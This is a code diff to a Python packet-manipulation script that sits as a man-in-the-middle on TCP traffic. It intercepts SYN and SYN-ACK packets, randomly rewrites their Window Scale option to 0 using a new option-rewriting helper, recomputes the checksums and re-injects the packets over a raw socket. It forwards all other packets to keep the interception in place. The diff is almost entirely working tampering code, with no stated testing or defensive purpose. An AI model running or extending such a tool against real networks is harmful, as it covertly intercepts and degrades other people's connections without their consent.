@@ -53,49 +53,65 @@ def parse_tcp_packet(packet):
         'options': options
     }
 
+def update_window_scale_option(options, new_scale):
+    """Update the Window Scale option in the TCP options, preserving all others."""
+    i = 0
+    out = b''
+    found = False
+    while i < len(options):
+        kind = options[i]
+        if kind == 0:  # End of options
+            out += options[i:]
+            break
+        elif kind == 1:  # NOP
+            out += options[i:i+1]
+            i += 1
+        elif kind == 3 and i+1 < len(options) and options[i+1] == 3:  # Window Scale
+            out += bytes([3, 3, new_scale])
+            i += 3
+            found = True
+        else:
+            if i+1 < len(options):
+                length = options[i+1]
+                out += options[i:i+length]
+                i += length
+            else:
+                break
+    if not found:
+        # If no window scale, append it (rare, but for completeness)
+        out += bytes([3, 3, new_scale])
+    # Pad to 4-byte boundary
+    while len(out) % 4 != 0:
+        out += b'\x01'  # NOP
+    return out
+
 def craft_tcp_packet(parsed_packet, window_scale=0):
-    """Craft a TCP packet with the specified Window Scale."""
-    # IP Header fields
-    ip_ver_ihl = 0x45  # Version 4, IHL 5 (20 bytes)
-    ip_tos = 0
-    ip_id = 54321
-    ip_frag = 0
-    ip_ttl = 255
-    ip_proto = socket.IPPROTO_TCP
-    src_ip_bytes = socket.inet_aton(parsed_packet['src_ip'])
-    dst_ip_bytes = socket.inet_aton(parsed_packet['dst_ip'])
-
-    # TCP Header fields
-    seq_num = parsed_packet['seq_num']
-    ack_num = parsed_packet['ack_num']
-    data_offset = 6 << 4  # 24 bytes (20 header + 4 options)
-    flags = parsed_packet['flags']
-    window_size = parsed_packet['window_size']
-    tcp_checksum = 0
-    urgent_ptr = 0
-
-    # TCP Options: Window Scale (3 bytes) + NOP (1 byte)
-    options = bytes([3, 3, window_scale, 1])
-
+    """Craft a TCP packet, preserving all options but forcing Window Scale to new value."""
+    # Update options
+    options = update_window_scale_option(parsed_packet['options'], window_scale)
+    data_offset = (20 + len(options)) // 4 << 4
     # Build TCP header without checksum
     tcp_header = struct.pack(TCP_HEADER, parsed_packet['src_port'], parsed_packet['dst_port'],
-                             seq_num, ack_num, data_offset, flags, window_size, tcp_checksum, urgent_ptr) + options
+                             parsed_packet['seq_num'], parsed_packet['ack_num'], data_offset, parsed_packet['flags'],
+                             parsed_packet['window_size'], 0, 0) + options
 
     # Calculate TCP checksum with pseudo-header
+    src_ip_bytes = socket.inet_aton(parsed_packet['src_ip'])
+    dst_ip_bytes = socket.inet_aton(parsed_packet['dst_ip'])
+    ip_proto = socket.IPPROTO_TCP
     pseudo_header = src_ip_bytes + dst_ip_bytes + struct.pack('!BBH', 0, ip_proto, len(tcp_header))
     tcp_checksum = calculate_checksum(pseudo_header + tcp_header)
     tcp_header = struct.pack(TCP_HEADER, parsed_packet['src_port'], parsed_packet['dst_port'],
-                             seq_num, ack_num, data_offset, flags, window_size, tcp_checksum, urgent_ptr) + options
+                             parsed_packet['seq_num'], parsed_packet['ack_num'], data_offset, parsed_packet['flags'],
+                             parsed_packet['window_size'], tcp_checksum, 0) + options
 
     # Build IP header with correct total length
-    ip_len = 20 + len(tcp_header)  # 20 (IP) + 24 (TCP) = 44 bytes
-    ip_header = struct.pack(IP_HEADER, ip_ver_ihl, ip_tos, ip_len, ip_id,
-                            ip_frag, ip_ttl, ip_proto, 0, src_ip_bytes, dst_ip_bytes)
-
-    # Calculate IP checksum
+    ip_len = 20 + len(tcp_header)
+    ip_header = struct.pack(IP_HEADER, 0x45, 0, ip_len, 54321,
+                            0, 255, ip_proto, 0, src_ip_bytes, dst_ip_bytes)
     ip_checksum = calculate_ip_checksum(ip_header)
-    ip_header = struct.pack(IP_HEADER, ip_ver_ihl, ip_tos, ip_len, ip_id,
-                            ip_frag, ip_ttl, ip_proto, ip_checksum, src_ip_bytes, dst_ip_bytes)
+    ip_header = struct.pack(IP_HEADER, 0x45, 0, ip_len, 54321,
+                            0, 255, ip_proto, ip_checksum, src_ip_bytes, dst_ip_bytes)
 
     # Combine IP and TCP headers
     return ip_header + tcp_header
@@ -113,16 +129,18 @@ def process_packet(packet, client_ip, server_ip, sock_send):
         parsed = parse_tcp_packet(packet[14:])  # Skip Ethernet header
         # Check for SYN or SYN-ACK
         if parsed['flags'] == 0x02 or parsed['flags'] == 0x12:  # Only SYN or SYN-ACK
-            if random.random() < 0.5:  # 50% chance
-                print(f"Intercepted SYN/SYN-ACK (MODIFIED): {src_ip}:{parsed['src_port']} -> {dst_ip}:{parsed['dst_port']}")
-                new_packet = craft_tcp_packet(parsed, window_scale=0)
+            if random.random() < 0.5:
+                window_scale = 0
+                print(f"Intercepted SYN/SYN-ACK (MODIFIED): {src_ip}:{parsed['src_port']} -> {dst_ip}:{parsed['dst_port']} | Window Scale set to 0")
+                new_packet = craft_tcp_packet(parsed, window_scale=window_scale)
                 sock_send.sendto(new_packet, (parsed['dst_ip'], 0))
                 print("Sent modified packet with Window Scale = 0")
             else:
                 print(f"Intercepted SYN/SYN-ACK (UNMODIFIED): {src_ip}:{parsed['src_port']} -> {dst_ip}:{parsed['dst_port']}")
                 sock_send.sendto(packet[14:], (parsed['dst_ip'], 0))
         else:
-            # Forward unmodified packet to maintain MITM
+            # Forward all other TCP packets (data, ACK, FIN, etc.)
+            print(f"Forwarding non-handshake TCP packet: {src_ip}:{parsed['src_port']} -> {dst_ip}:{parsed['dst_port']}")
             sock_send.sendto(packet[14:], (parsed['dst_ip'], 0))
 
 def main():
